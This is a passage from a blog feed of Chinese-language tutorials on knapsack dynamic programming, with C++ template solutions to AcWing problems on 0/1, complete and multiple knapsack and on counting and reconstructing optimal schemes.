number">50</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> f<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//f[i][j]表示从前i件商品里选花费j元时买书的方案</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> n<span class="token punctuation">;</span>    cin<span class="token operator">>></span>n<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//花光m元 </span>    f<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//挑0件物品花费0元的方案为1，一定要记得写 </span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span><span class="token number">4</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            f<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>f<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//第i本书还不做选择的时候全部由上一层状态转移过来</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>j<span class="token operator">>=</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//价格不能超过j</span>                f<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">=</span>f<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//恰好型问题的写法 </span>            <span class="token punctuation">}</span>         <span class="token punctuation">}</span>     <span class="token punctuation">}</span>    cout<span class="token operator">&lt;&lt;</span>f<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//方案数肯定在最后一位 </span><span class="token punctuation">}</span></code></pre><p>补充：完全背包方案数中较难的一道题 ：<br>货币系统<a href="https://www.acwing.com/problem/content/534/" target="_blank" rel="noopener">https://www.acwing.com/problem/content/534/</a><br>本题的难点在于查找数学上的一些性质,如果一个数可以有大于等于两种的方式拼凑出来,那么这个数就可以去掉</p><h2 id="四-方案数问题：01背包的方案数问题"><a href="#四-方案数问题：01背包的方案数问题" class="headerlink" title="四.方案数问题：01背包的方案数问题"></a>四.方案数问题：01背包的方案数问题</h2><p><strong><em>背包问题求方案数<a href="https://www.acwing.com/problem/content/11/" target="_blank" rel="noopener">https://www.acwing.com/problem/content/11/</a></em></strong></p><h3 id="一-模型含义-1"><a href="#一-模型含义-1" class="headerlink" title="一.模型含义"></a>一.模型含义</h3><p>01背包的背景下问最大价值的方案数</p><h3 id="二-代码分析-1"><a href="#二-代码分析-1" class="headerlink" title="二.代码分析"></a>二.代码分析</h3><p>同01背包的循环,当价值可以被更新的时候,转移dp数组方案数,当价值相等的时候,要累加方案数,通知最后要更新f数组</p><h3 id="三-AC代码-2"><a href="#三-AC代码-2" class="headerlink" title="三.AC代码"></a>三.AC代码</h3><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;bits/stdc++.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> N<span class="token operator">=</span><span class="token number">1010</span><span class="token punctuation">;</span><span class="token keyword">int</span> f<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span>w<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//dp[i]表示最多有i的体积的时候的方案数</span>                         <span class="token comment" spellcheck="true">//f[i]表示的是体积不超过i的最大价值</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span>V<span class="token punctuation">;</span>    cin<span class="token operator">>></span>n<span class="token operator">>></span>V<span class="token punctuation">;</span>    <span class="token function">fill</span><span class="token punctuation">(</span>dp<span class="token punctuation">,</span>dp<span class="token operator">+</span>N<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        cin<span class="token operator">>></span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">>></span>w<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span>V<span class="token punctuation">;</span>j<span class="token operator">>=</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>j<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>f<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">&lt;</span>f<span class="token punctuation">[</span>j<span class="token operator">-</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span>w<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//状态可转移</span>            <span class="token punctuation">{</span>                dp<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>dp<span class="token punctuation">[</span>j<span class="token operator">-</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>               dp<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">%</span><span class="token operator">=</span><span class="token number">1000000007</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>f<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">==</span>f<span class="token punctuation">[</span>j<span class="token operator">-</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span>w<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//出现结果相同的方案要叠加</span>             <span class="token punctuation">{</span>                  dp<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">=</span>dp<span class="token punctuation">[</span>j<span class="token operator">-</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                  dp<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">%</span><span class="token operator">=</span><span class="token number">1000000000</span><span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span>            f<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>f<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span>f<span class="token punctuation">[</span>j<span class="token operator">-</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span> w<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>        cout<span class="token operator">&lt;&lt;</span>dp<span class="token punctuation">[</span>V<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="五-一维背包问题求具体方案"><a href="#五-一维背包问题求具体方案" class="headerlink" title="五.一维背包问题求具体方案"></a>五.一维背包问题求具体方案</h2><p><strong><em>背包问题求具体方案<a href="https://www.acwing.com/problem/content/12/" target="_blank" rel="noopener">https://www.acwing.com/problem/content/12/</a></em></strong></p><h3 id="一-模型含义-2"><a href="#一-模型含义-2" class="headerlink" title="一.模型含义"></a>一.模型含义</h3><p>在一维背包的背景下求价值最大的其中一个具体方案</p><h3 id="二-代码分析-2"><a href="#二-代码分析-2" class="headerlink" title="二.代码分析"></a>二.代码分析</h3><p><strong><em>注意：01背包问题的二维模板循环V的时候顺序无所谓但是长度一定要从0到V</em></strong><br>在求方案数问题中,其实是一个做逆向操作的过程,看看最终的结果是如何转移回原点就可以知道该如何解了</p><h3 id="三-代码模板"><a href="#三-代码模板" class="headerlink" title="三.代码模板"></a>三.代码模板</h3><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;bits/stdc++.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> N<span class="token operator">=</span><span class="token number">1010</span><span class="token punctuation">;</span><span class="token keyword">int</span> f<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span>w<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span>V<span class="token punctuation">;</span>    cin<span class="token operator">>></span>n<span class="token operator">>></span>V<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        cin<span class="token operator">>></span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">>></span>w<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> n<span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">--</span> <span class="token punctuation">)</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> V<span class="token punctuation">;</span> j <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">--</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>            f<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>  <span class="token operator">=</span> f<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//还没选第i件的情况</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>j <span class="token operator">>=</span> v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> f<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>f<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> f<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+</span> w<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token keyword">int</span> j<span class="token operator">=</span>V<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//f[1][V]这里f[1][v]为价值最大的点</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//为了字典序，上面从大到小,这里从小到大</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>j <span class="token operator">>=</span> v<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> f<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> f<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+</span> w<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//看看f[i][j]是从哪一步转移过来的</span>        <span class="token punctuation">{</span>            cout <span class="token operator">&lt;&lt;</span> i <span class="token operator">&lt;&lt;</span> <span class="token string">' '</span><span class="token punctuation">;</span>            j <span class="token operator">-</span><span class="token operator">=</span> v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
          <category> dp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> dp </tag>
            
            <tag> 背包问题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>背包模型基础篇</title>
      <link href="/2020/08/06/bei-bao-mo-xing-ji-chu-pian/"/>
      <url>/2020/08/06/bei-bao-mo-xing-ji-chu-pian/</url>
      
        <content type="html"><![CDATA[<h2 id="一-01背包问题"><a href="#一-01背包问题" class="headerlink" title="一.01背包问题"></a>一.01背包问题</h2><h3 id="一-模型含义"><a href="#一-模型含义" class="headerlink" title="一.模型含义 :"></a>一.模型含义 :</h3><p>有限个物品n和体积为V的背包,每个物品只有一个,其价值为w[i],占用体积为v[i],求出在<strong><em>总体积不超过V</em></strong>的情况下能选出的最大价值      </p><h3 id="二-注意点"><a href="#二-注意点" class="headerlink" title="二.注意点"></a>二.注意点</h3><p>01背包循环体积的时候一定要倒着循环(对于一维dp的写法,二维的随便),因为他每一轮i都要用到上一轮 i 的数据,如果正向循环会导致用到的是这一轮更新的 i. <strong><em>dp[i]表示的是体积不超过i的时候的最大价值</em></strong></p><h3 id="三-代码模板"><a href="#三-代码模板" class="headerlink" title="三.代码模板"></a>三.代码模板</h3><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;bits/stdc++.h&gt;</span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span> <span class="token keyword">int</span> dp<span class="token punctuation">[</span><span class="token number">10001</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span>V<span class="token punctuation">;</span>    cin<span class="token operator">&gt;&gt;</span>n<span class="token operator">&gt;&gt;</span>V<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">int</span> w<span class="token punctuation">,</span>v<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//w是价值,w是体积,也可以提前创建数组读取</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span>V<span class="token punctuation">;</span>j<span class="token operator">&gt;=</span>v<span class="token punctuation">;</span>j<span class="token operator">--</span><span class="token punctuation">)</span>            dp<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>j<span class="token operator">-</span>v<span class="token punctuation">]</span><span class="token operator">+</span>w<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//以体积为状态，当前某体积j的最大价值等于未更新时值与在从某个体积更新而来的值取max </span>    <span class="token punctuation">}</span>     cout<span class="token operator">&lt;&lt;</span>dp<span class="token punctuation">[</span>V<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span> </code></pre><h2 id="二-完全背包问题"><a href="#二-完全背包问题" class="headerlink" title="二.完全背包问题"></a>二.完全背包问题</h2><h3 id="1-模型含义"><a href="#1-模型含义" class="headerlink" title="1.模型含义"></a>1.模型含义</h3><p>有n种物品且每种物品数量无限和体积为V的背包,占用体积为v[i]其价值为w[i],求在<strong><em>总体积不超过V</em></strong>的情况下能选出的最大价值</p><h3 id="2-代码模板-体积的循环那里正向即可-其他的和01背包一样"><a href="#2-代码模板-体积的循环那里正向即可-其他的和01背包一样" class="headerlink" title="2.代码模板(体积的循环那里正向即可,其他的和01背包一样)"></a>2.代码模板(体积的循环那里正向即可,其他的和01背包一样)</h3><pre class=" language-cpp"><code class="language-cpp"><span class="token comment" spellcheck="true">//完全背包二维写法</span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;bits/stdc++.h&gt;</span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> N<span class="token operator">=</span><span class="token number">1010</span><span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">,</span>V<span class="token punctuation">;</span><span class="token keyword">int</span> v<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span>w<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> f<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//f[i][j]表示选前i件物品占用体积为j时物品的最大价值</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    cin<span class="token operator">&gt;&gt;</span>n<span class="token operator">&gt;&gt;</span>V<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            cin<span class="token operator">&gt;&gt;</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&gt;&gt;</span>w<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>j<span class="token operator">&lt;=</span>V<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                f<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>f<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span>f<span class="token punctuation">[</span>j<span class="token operator">-</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span>w<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//这里的公式是可以直接背的，是同时f[i][j]和f[i][j-v[i]]推出来的 </span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    cout<span class="token operator">&lt;&lt;</span>f<span class="token punctuation">[</span>V<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span> </code></pre><h2 id="三-多重背包问题"><a href="#三-多重背包问题" class="headerlink" title="三.多重背包问题"></a>三.多重背包问题</h2><h3 id="一-模型含义-1"><a href="#一-模型含义-1" class="headerlink" title="一.模型含义"></a>一.模型含义</h3><p>（有n种物品和体积为V的背包,每种物品的个数有限)<strong><em>即有限个物品n</em></strong>,求在<strong><em>总体积不超过V</em></strong>的情况下能选出的最大价值  </p><h3 id="二-模型-代码分析"><a href="#二-模型-代码分析" class="headerlink" title="二.模型+代码分析"></a>二.模型+代码分析</h3><h4 id="对于朴素版"><a href="#对于朴素版" class="headerlink" title="对于朴素版:"></a>对于朴素版:</h4><p>1.f[i][j]表示的是对于第i件物品,当体积不超过j的情况下的最大价值<br><strong><em>2.注意：V那一层的循环是从最大值到0或者从0到最大值(本质和01背包的二维写法一样),因为如果循环的时候没有写到0的话,由于f[i]由f[i-1]更新过来的,那么在上一轮没更新的f[i-1][j]中(其中j&lt;v[i-1],所以没被更新,那就一直是0，数据得不到转移,即少了在第i-1件物品时背包太小选不了的情况)</em></strong>  </p><h4 id="对于二进制优化版："><a href="#对于二进制优化版：" class="headerlink" title="对于二进制优化版："></a>对于二进制优化版：</h4><p>1.利用二进制优化的思想,即由2^0到2^n组成的数,可以通过运算组成2^0到2^(n+1)个数,就不用暴力一个个的遍历了<br>2.将用二进制优化打包好的一组组数据看成是一个物品整体，使用01背包的模板解出答案</p><h3 id="三-代码模板-1"><a href="#三-代码模板-1" class="headerlink" title="三.代码模板"></a>三.代码模板</h3><h4 id="朴素版-O-NVk-具体循环了多少k不知道-最差的情况会在N-V-V-如果物品体积很小的话会更大）"><a href="#朴素版-O-NVk-具体循环了多少k不知道-最差的情况会在N-V-V-如果物品体积很小的话会更大）" class="headerlink" title="朴素版(O(NVk),具体循环了多少k不知道,最差的情况会在N *V *V,如果物品体积很小的话会更大）"></a>朴素版(O(N<em>V</em>k),具体循环了多少k不知道,最差的情况会在N *V *V,如果物品体积很小的话会更大）</h4><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;bits/stdc++.h&gt;</span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> N<span class="token operator">=</span><span class="token number">1100</span><span class="token punctuation">;</span><span class="token keyword">int</span> f<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span>V<span class="token punctuation">;</span>    cin<span class="token operator">&gt;&gt;</span>n<span class="token operator">&gt;&gt;</span>V<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">int</span> v<span class="token punctuation">,</span>w<span class="token punctuation">,</span>s<span class="token punctuation">;</span>        cin<span class="token operator">&gt;&gt;</span>v<span class="token operator">&gt;&gt;</span>w<span class="token operator">&gt;&gt;</span>s<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span>V<span class="token punctuation">;</span>j<span class="token operator">&gt;=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>k<span class="token operator">&lt;=</span>s<span class="token operator">&amp;&amp;</span>k<span class="token operator">*</span>v<span class="token operator">&lt;=</span>j<span class="token punctuation">;</span>k<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">//一种物品选不同个数的情况</span>                    f<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>f<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span>f<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span>k<span class="token operator">*</span>v<span class="token punctuation">]</span><span class="token operator">+</span>w<span class="token operator">*</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    cout<span class="token operator">&lt;&lt;</span>f<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">[</span>V<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h4 id="二进制优化版"><a href="#二进制优化版" class="headerlink" title="二进制优化版"></a>二进制优化版</h4><pre class=" language-cpp"><code class="language-cpp"><span class="token comment" spellcheck="true">//二进制优化 </span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;bits/stdc++.h&gt;</span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> N<span class="token operator">=</span><span class="token number">12010</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//注意，这里n要开到cnt那么大，一种物品可以最多有两千个的话压缩成二进制要12位，1000种物品就开开到12000以上</span><span class="token keyword">int</span> f<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span>v<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">,</span>w<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">,</span>V<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    cin<span class="token operator">&gt;&gt;</span>n<span class="token operator">&gt;&gt;</span>V<span class="token punctuation">;</span>    <span class="token keyword">int</span> cnt<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">int</span> v1<span class="token punctuation">,</span>w1<span class="token punctuation">,</span>s1<span class="token punctuation">;</span>        cin<span class="token operator">&gt;&gt;</span>v1<span class="token operator">&gt;&gt;</span>w1<span class="token operator">&gt;&gt;</span>s1<span class="token punctuation">;</span>        <span class="token keyword">int</span> k<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>k<span class="token 